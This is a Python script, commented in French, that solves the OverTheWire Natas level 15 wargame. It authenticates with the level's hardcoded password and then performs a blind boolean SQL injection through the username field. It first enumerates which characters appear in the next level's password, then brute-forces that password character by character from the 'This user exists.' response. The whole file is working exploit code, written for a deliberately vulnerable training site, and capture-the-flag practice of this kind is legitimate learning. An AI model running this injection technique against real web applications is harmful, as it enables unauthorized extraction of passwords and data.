#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests  # Gestion des requêtes
import string    # Gestion des chaîne caractères
import tqdm      # Afficher une barre de progression.

# Variable pour se connecter au site et valider la première demande de mot de passe.
url = "http://natas15.natas.labs.overthewire.org/"
user = "natas15"
passw = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

# Connexion avec le nom d'utilisateur, ainsi que le mot de passe.
response = requests.get(url, auth=(user, passw))
session1 = requests.Session()

# Création de la liste de tout les caractères à test pour trouver le mot de passe pendant l'injection.
characters = ''.join([string.ascii_letters,string.digits])

# Variable qui stock les caractères présent dans le mot de passe.
chracters_used_in_passwd = []

# on test toutes les lettres
for c in tqdm.tqdm(characters): # barre de progession
    # Injection Sql avec l'authentification : 
    # Selectf from users where username="natas16" and password like binary "%a%"
    response = session1.post(url,
                             data = {'username' : f'natas16" and password like binary "%{c}%'},
                             auth = (user, passw) )
    # Si l'utilisateur existe alors la lettre est dans le mot de passe et on le met de coté.
    if "This user exists." in response.text: 
        chracters_used_in_passwd.append(c)
print("caractère utilisé dans le mot de passe: ", chracters_used_in_passwd)

# Variable qui contient le mot de passe 
restored_passw = ""

# On refait un injection en brute forcant le mot de passe avec les caractères connu.
for _ in tqdm.tqdm(range(32)):
    for c in chracters_used_in_passwd:
        # fabrication des mots passe à tester
        tmp_passw = restored_passw + c
        # Injection Sql avec l'authentification : 
        # Selectf from users where username="natas16" and password like binary "a%"
        response = session1.post(url,
                                 data = {'username' : f'natas16" and password like binary "{tmp_passw}%'},
                                 auth = (user, passw) )
        # Si la lettre est bonne alors on l'ajoute au mot de passe
        if "This user exists." in response.text:
            restored_passw = tmp_passw
print("Mot de passe finale: ", restored_passw)
